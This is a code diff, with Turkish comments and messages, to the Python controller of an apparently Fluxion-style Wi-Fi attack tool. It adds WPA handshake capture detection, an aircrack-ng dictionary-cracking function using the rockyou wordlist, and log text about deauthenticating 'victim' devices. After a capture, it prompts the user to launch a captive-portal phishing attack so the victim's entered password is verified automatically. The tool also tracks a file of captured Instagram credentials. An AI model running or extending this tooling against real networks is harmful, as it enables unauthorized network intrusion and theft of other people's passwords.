@@ -28,6 +28,7 @@ from models import (
     AttackType,
     CapturedCredential,
     EnvironmentCheck,
+    HandshakeFile,
     PortalSite,
     TargetCandidate,
     WirelessInterface,
@@ -41,7 +42,8 @@ WORKSPACE = Path(os.environ.get("CAPCAPWorkspacePath", "/tmp/capcapspace"))
 STATUS_FILE = WORKSPACE / "capcap.status"
 CREDENTIAL_LOG = WORKSPACE / "instagram_credentials.log"
 
-ANSI_RE = re.compile(r"\x1b\[[0-9;]*[A-Za-z]")
+ANSI_RE = re.compile(r"\x1b(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")
+TMUX_BAR_RE = re.compile(r"^\[CAPCAPWIF\d+:.*\]")
 MAC_RE = re.compile(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$")
 
 # `--scan-only` çıktısı sabit genişlikli sütunlar basar:
@@ -82,6 +84,33 @@ OPTIONAL_TOOLS = (
 
 def strip_ansi(text: str) -> str:
     return ANSI_RE.sub("", text)
+
+
+def clean_log_line(raw: str) -> str:
+    """Terminal kontrol karakterlerini ve gereksiz tmux alt bant gürültüsünü temizler."""
+    line = strip_ansi(raw).strip()
+    if not line:
+        return ""
+    # Ham tmux bar veya xterm başlık satırlarını temizle
+    if TMUX_BAR_RE.match(line) and not any(k in line for k in ("Hedef", "WPA", "Handshake", "BSSID", "ESSID", "Deauth", "aireplay")):
+        return ""
+    # Terminal escape kırıntıları
+    if line.startswith(("\033", "(B", "[?12l", "[?25h", "[?25l")):
+        return ""
+    return line
+
+
+def humanize_log(line: str) -> tuple[str, str]:
+    """Teknik terminal satırlarını son kullanıcının anlayabileceği Türkçe açıklamalarla zenginleştirir."""
+    if "Sending 64 directed Deauth" in line or "WPA handshake:" in line:
+        return f"⚡ [Deauth] Kurban cihaza bağlantı kesme paketi gönderiliyor... ({line})", "warn"
+    if "Notice: Target tracker" in line:
+        return "🎯 Hedef takipçisi aktif: Kanal değişiklikleri izleniyor.", "info"
+    if "aireplay-ng" in line and "deauth" in line:
+        return "⚡ [Deauth] Aireplay-ng ile hedef cihazların bağlantısı geçici kesiliyor...", "warn"
+    if "airodump-ng" in line:
+        return "📡 Airodump-ng hedef kanalda dinlemeye başladı...", "info"
+    return line, "raw"
 
 
 def _int_or(value: str, default: int) -> int:
@@ -199,11 +228,14 @@ class CapCapWifiController:
         self._stop_watching = threading.Event()
         self._pending_output: List[str] = []
         self._install_result: Optional[bool] = None
+        self._handshake_detected = False
+        self._last_config: Optional[AttackConfig] = None
 
         self.on_state_change: Callable[[AttackState], None] = lambda s: None
         self.on_log: Callable[[str, str], None] = lambda msg, level: None
         self.on_candidates: Callable[[List[TargetCandidate]], None] = lambda c: None
         self.on_credential: Callable[[CapturedCredential], None] = lambda c: None
+        self.on_handshake: Callable[[HandshakeFile], None] = lambda h: None
         self.on_environment: Callable[[List[EnvironmentCheck]], None] = lambda c: None
         self.on_dependency_install: Callable[[bool], None] = lambda ok: None
 
@@ -374,11 +406,94 @@ class CapCapWifiController:
             )
         return portals
 
-    def list_handshakes(self) -> List[str]:
+    def list_handshakes(self) -> List[HandshakeFile]:
         folder = REPO_DIR / "attacks" / "Handshake Snooper" / "handshakes"
+        res: List[HandshakeFile] = []
         if not folder.is_dir():
-            return []
-        return sorted(p.name for p in folder.glob("*.cap"))
+            return res
+        for p in sorted(folder.glob("*.cap"), key=lambda x: x.stat().st_mtime, reverse=True):
+            ssid = ""
+            bssid = ""
+            stem = p.stem
+            if "-" in stem:
+                parts = stem.rsplit("-", 1)
+                ssid = parts[0]
+                bssid = parts[1]
+            else:
+                ssid = stem
+            stat = p.stat()
+            mtime_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(stat.st_mtime))
+            res.append(HandshakeFile(
+                filename=p.name,
+                filepath=str(p),
+                ssid=ssid,
+                bssid=bssid,
+                size_bytes=stat.st_size,
+                created_at=mtime_str,
+            ))
+        return res
+
+    def crack_handshake(
+        self,
+        cap_path: str,
+        bssid: str = "",
+        wordlist_path: str = "/usr/share/wordlists/rockyou.txt",
+        on_done: Callable[[bool, str], None] = None,
+    ) -> None:
+        """Aircrack-ng ile arka planda wordlist kırma işlemi başlatır."""
+        if not os.path.exists(cap_path):
+            self._log(f"Handshake dosyası bulunamadı: {cap_path}", "error")
+            return
+        if not os.path.exists(wordlist_path):
+            self._log(
+                f"Wordlist bulunamadı: {wordlist_path}. "
+                "Kali'de 'sudo gzip -d /usr/share/wordlists/rockyou.txt.gz' çalıştırabilirsiniz.",
+                "warn",
+            )
+            return
+
+        self._log("🔑 Aircrack-ng ile sözlük saldırısı başlatıldı...", "info")
+        self._log(f"   Handshake: {Path(cap_path).name}", "info")
+        self._log(f"   Wordlist: {wordlist_path}", "info")
+
+        def _worker():
+            cmd = ["aircrack-ng"]
+            if bssid:
+                cmd += ["-b", bssid]
+            cmd += ["-w", wordlist_path, cap_path]
+            try:
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
+                )
+                found_pw = ""
+                for raw in proc.stdout:
+                    clean = strip_ansi(raw.strip())
+                    if not clean:
+                        continue
+                    if "KEY FOUND!" in clean:
+                        self._log(f"🎉 {clean}", "success")
+                        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean)
+                        if m:
+                            found_pw = m.group(1)
+                    elif any(w in clean for w in ("Current passphrase:", "keys tested", "Master Key")):
+                        pass
+                    else:
+                        self._log(clean, "raw")
+                proc.wait()
+                if found_pw:
+                    self._log(f"🎉 PAROLA ÇÖZÜLDÜ: {found_pw}", "success")
+                    if on_done:
+                        on_done(True, found_pw)
+                else:
+                    self._log("❌ Parola bu sözlük içinde bulunamadı.", "warn")
+                    if on_done:
+                        on_done(False, "")
+            except Exception as e:
+                self._log(f"Aircrack-ng hatası: {e}", "error")
+                if on_done:
+                    on_done(False, str(e))
+
+        threading.Thread(target=_worker, daemon=True).start()
 
     # ── tarama ──────────────────────────────────────────────────
 
@@ -460,6 +575,8 @@ class CapCapWifiController:
         if config.timeout_minutes:
             args += ["--timeout", str(config.timeout_minutes)]
 
+        self._last_config = config
+        self._handshake_detected = False
         self._set_state(AttackState.STARTING)
         self._log(
             f"Saldırı başlatılıyor: {config.attack_type.value} → "
@@ -544,11 +661,12 @@ class CapCapWifiController:
 
         try:
             for raw in proc.stdout:  # type: ignore[union-attr]
-                line = strip_ansi(raw.rstrip())
+                line = clean_log_line(raw.rstrip())
                 if not line:
                     continue
                 self._pending_output.append(line)
-                self._log(line, "raw")
+                h_line, h_level = humanize_log(line)
+                self._log(h_line, h_level)
                 self._handle_status_line(line, mode)
         finally:
             proc.wait()
@@ -607,8 +725,48 @@ class CapCapWifiController:
             self._set_state(AttackState.RUNNING)
         elif kind == "TIMEOUT":
             self._log(f"Süre doldu ({event.get('minutes', '?')} dk), saldırı kapatılıyor.", "warn")
+        elif kind == "HANDSHAKE_CAPTURED":
+            path = event.get("path", "")
+            self._handle_handshake_captured(path)
         elif kind == "RESULT":
             self._handle_result(event)
+
+    def _handle_handshake_captured(self, path_str: str) -> None:
+        p = Path(path_str) if path_str else None
+        ssid = ""
+        bssid = ""
+        size = 0
+        mtime_str = time.strftime("%H:%M:%S")
+        if p and p.exists():
+            size = p.stat().st_size
+            mtime_str = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(p.stat().st_mtime))
+            stem = p.stem
+            if "-" in stem:
+                parts = stem.rsplit("-", 1)
+                ssid = parts[0]
+                bssid = parts[1]
+            else:
+                ssid = stem
+        elif self._last_config:
+            ssid = self._last_config.target_essid
+            bssid = self._last_config.target_bssid
+            path_str = str(REPO_DIR / "attacks" / "Handshake Snooper" / "handshakes" / f"{ssid}-{bssid}.cap")
+
+        hf = HandshakeFile(
+            filename=p.name if p else f"{ssid}.cap",
+            filepath=path_str,
+            ssid=ssid,
+            bssid=bssid,
+            size_bytes=size,
+            created_at=mtime_str,
+        )
+        self._set_state(AttackState.HANDSHAKE_CAPTURED)
+        self._log("🎉 TEBRİKLER! WPA 4-Yönlü Handshake başarıyla yakalandı ve doğrulandı!", "success")
+        self._log(f"📁 Kayıt konumu: {path_str}", "info")
+        self._log("💡 ŞİMDİ NE YAPILMALI?", "warn")
+        self._log("   1. (Önerilen) Bu ağ için Captive Portal saldırısı başlatın. Kurban şifre girdiğinde sistem yakalanan bu handshake ile şifrenin doğruluğunu otomatik teyit eder!", "info")
+        self._log("   2. Veya 'Şifreler' sekmesinden aircrack-ng ile wordlist kırma işlemi başlatabilirsiniz.", "info")
+        self.on_handshake(hf)
 
     def _handle_result(self, event: Dict[str, str]) -> None:
         password = event.get("password")
@@ -625,8 +783,7 @@ class CapCapWifiController:
             self.on_credential(cred)
             self._set_state(AttackState.CREDENTIALS_FOUND)
         elif handshake:
-            self._set_state(AttackState.HANDSHAKE_CAPTURED)
-            self._log(f"Handshake yakalandı: {handshake}", "success")
+            self._handle_handshake_captured(handshake)
 
     def _watch_workspace(self, mode: str) -> None:
         """Süreç çalışırken status ve kimlik dosyalarını izler."""
@@ -643,6 +800,15 @@ class CapCapWifiController:
                 cred_offset = self._read_new_lines(
                     CREDENTIAL_LOG, cred_offset, self._handle_credential_line, mode
                 )
+
+            # Handshake Snooper flag kontrolü
+            flag_file = WORKSPACE / "handshake_success.flag"
+            if flag_file.exists() and not self._handshake_detected:
+                self._handshake_detected = True
+                folder = REPO_DIR / "attacks" / "Handshake Snooper" / "handshakes"
+                caps = sorted(folder.glob("*.cap"), key=lambda x: x.stat().st_mtime, reverse=True) if folder.is_dir() else []
+                recent_cap = str(caps[0]) if caps else str(WORKSPACE / "capture" / "recent.cap")
+                self._handle_handshake_captured(recent_cap)
 
             self._stop_watching.wait(0.4)
 
